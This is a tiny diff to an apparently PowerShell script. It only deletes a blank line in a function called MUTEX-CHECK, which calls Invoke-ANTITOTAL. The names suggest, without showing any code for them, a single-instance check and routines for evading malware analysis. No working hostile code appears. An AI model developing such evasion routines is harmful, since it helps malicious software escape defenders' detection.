@@ -13,7 +13,6 @@ function MUTEX-CHECK {
     } else {
         Invoke-ANTITOTAL
     }
-    
 }
 
 Add-Type -AssemblyName PresentationCore,PresentationFramework
